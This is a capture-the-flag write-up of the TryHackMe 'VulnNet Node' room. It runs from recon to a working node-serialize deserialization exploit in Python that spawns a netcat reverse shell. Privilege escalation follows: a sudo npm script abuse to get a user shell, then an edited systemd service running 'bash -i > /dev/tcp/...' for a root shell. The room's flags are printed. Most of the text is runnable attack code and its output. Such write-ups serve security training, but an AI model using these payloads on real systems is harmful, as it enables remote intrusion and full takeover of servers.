---
tags:
title: Vulnet Node - Easy (THM)
permalink: /Vulnet-Node-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
nmap_default 10.66.187.168
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-24 19:35 -03
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Initiating Ping Scan at 19:35
Scanning 10.66.187.168 [4 ports]
Completed Ping Scan at 19:35, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:35
Completed Parallel DNS resolution of 1 host. at 19:35, 0.00s elapsed
Initiating SYN Stealth Scan at 19:35
Scanning 10.66.187.168 [1000 ports]
Discovered open port 22/tcp on 10.66.187.168
Discovered open port 8080/tcp on 10.66.187.168
Increasing send delay for 10.66.187.168 from 0 to 5 due to 667 out of 1667 dropped probes since last increase.
Completed SYN Stealth Scan at 19:35, 0.41s elapsed (1000 total ports)
Initiating Service scan at 19:35
Scanning 2 services on 10.66.187.168
Completed Service scan at 19:35, 8.75s elapsed (2 services on 1 host)
NSE: Script scanning 10.66.187.168.
Initiating NSE at 19:35
Completed NSE at 19:35, 4.67s elapsed
Initiating NSE at 19:35
Completed NSE at 19:35, 0.78s elapsed
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Nmap scan report for 10.66.187.168
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 f6c94df03b6d8805ac0b179479c4cf9d (RSA)
|   256 117e41b1429b17febc7bd7f6a1783cf4 (ECDSA)
|_  256 9520597d770fefdc168b2a88f05a00a6 (ED25519)
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
           Raw packets sent: 1709 (75.172KB) | Rcvd: 1708 (68.324KB)
```

![[Pasted image 20260424193540.png]]


```bash
 searchsploit nodejs
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
KeystoneJS 4.0.0-beta.5 - Cross-Site Scripting                                                                                                     | nodejs/webapps/43054.txt
KeystoneJS 4.0.0-beta.5 - CSV Excel Macro Injection                                                                                                | nodejs/webapps/43053.txt
KeystoneJS < 4.0.0-beta.7 - Cross-Site Request Forgery                                                                                             | nodejs/webapps/43922.html
NodeJS 24.x - Path Traversal                                                                                                                       | nodejs/remote/52369.py
NodeJS Debugger - Command Injection (Metasploit)                                                                                                   | multiple/remote/42793.rb
Nodejs - 'js-yaml load()' Code Exec (Metasploit)                                                                                                   | multiple/local/28655.rb
Node.JS - 'node-serialize' Remote Code Execution (2)                                                                                               | nodejs/webapps/49552.py
Node.JS - 'node-serialize' Remote Code Execution (3)                                                                                               | nodejs/webapps/50036.js
Numbas < v7.3 - Remote Code Execution                                                                                                              | nodejs/webapps/51867.txt
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                           | nodejs/webapps/50716.rb
unzip-stream 0.3.1 - Arbitrary File Write                                                                                                          | nodejs/local/52276.py
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
[Apr 24, 2026 - 19:51:00 (-03)] exegol-thm Node # searchsploit -m nodejs/webapps/49552.py
  Exploit: Node.JS - 'node-serialize' Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/49552
     Path: /opt/tools/exploitdb/exploits/nodejs/webapps/49552.py
    Codes: CVE-2017-5941
 Verified: False
File Type: JavaScript source, ASCII text
Copied to: /workspace/Desktop/TryHackMe/Node/49552.py


[Apr 24, 2026 - 19:51:11 (-03)] exegol-thm Node # mv 49552.py
mv: missing destination file operand after '49552.py'
Try 'mv --help' for more information.
[Apr 24, 2026 - 19:51:13 (-03)] exegol-thm Node # mv 49552.py exploit.py
```

```python
import requests
import base64
import json
import sys

# Configuración
URL = 'http://10.66.187.168:8080/' # Cambia si la IP de la máquina varió
LHOST = '192.168.210.140'               # TU IP en la VPN (tun0)
LPORT = '4444'                          # El puerto donde escuchas con nc

# El payload es una IIFE (función autoejecutable) que redefine .end para ejecutar Bash
payload = (
    "require('http').ServerResponse.prototype.end = (function (end) {"
    "return function () {"
    "['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
    "const { exec } = require('child_process');"
    f"exec('busybox nc {LHOST} {LPORT} -e bash');"
    "}"
    "})(require('http').ServerResponse.prototype.end)"
)

# El prefijo _$$ND_FUNC$$_ indica a node-serialize que esto es una función.
# Los () al final son vitales para que se ejecute inmediatamente.
code = "_$$ND_FUNC$$_" + payload 

# Construimos el objeto exacto que el servidor espera
data = {
    "username": code,
    "isGuest": True,
    "encoding": "utf-8"
}

# Convertimos a JSON, luego a bytes, luego a Base64
json_string = json.dumps(data)
encoded_cookie = base64.b64encode(json_string.encode()).decode()

cookies = {'session': encoded_cookie}

print(f"[*] Payload generado para LHOST={LHOST} LPORT={LPORT}")
print(f"[*] Enviando petición a {URL}...")

try:
    # Ponemos un timeout porque si la shell conecta, el servidor no responderá el HTTP
    requests.get(URL, cookies=cookies, timeout=5)
    print("[-] El servidor respondió rápido. Es posible que el exploit no haya funcionado.")
except requests.exceptions.Timeout:
    print("[+] El servidor se quedó colgado. ¡Revisa tu listener de Netcat!")
except Exception as e:
    print(f"[!] Error: {e}")
```


```bash
 python3 exploit.py
[*] Payload generado para LHOST=192.168.210.140 LPORT=4444
[*] Enviando petición a http://10.66.187.168:8080/...
[+] El servidor se quedó colgado. ¡Revisa tu listener de Netcat!
```

```bash
nc -nvlp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:40068.
whoami
www
```

```bash
www@ip-10-66-187-168:/tmp$ echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
www@ip-10-66-187-168:/tmp$ sudo -u serv-manage /usr/bin/npm -C . run xxx

> @ xxx /tmp
> /bin/sh

$ whoami
serv-manage
```

```bash
$ cat user.txt
THM{064640a2f880ce9ed7a54886f1bde821}
```

```bash
$ sudo -l
Matching Defaults entries for serv-manage on ip-10-66-187-168:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on ip-10-66-187-168:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

```bash
cd /etc/systemd/system; ls -la

..snip..
drwxr-xr-x  2 root root        4096 Apr 26  2025 timers.target.wants
-rw-rw-r--  1 root serv-manage  167 Jan 24  2021 vulnnet-auto.timer
-rw-rw-r--  1 root serv-manage  197 Jan 24  2021 vulnnet-job.service
```

```bash
$ cat vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c "bash -i > /dev/tcp/192.168.210.140/4444 0>&1"

[Install]
WantedBy=multi-user.target
```

```bash
$ sudo /bin/systemctl daemon-reload
$ sudo /bin/systemctl start vulnnet-auto.timer
$
```

```bash
nc -nvlp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:52474.
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@ip-10-66-187-168:/root# cat root.txt
cat root.txt
THM{abea728f211b105a608a720a37adabf9}
```

```bash

```

```bash

```

```bash

```

```bash

```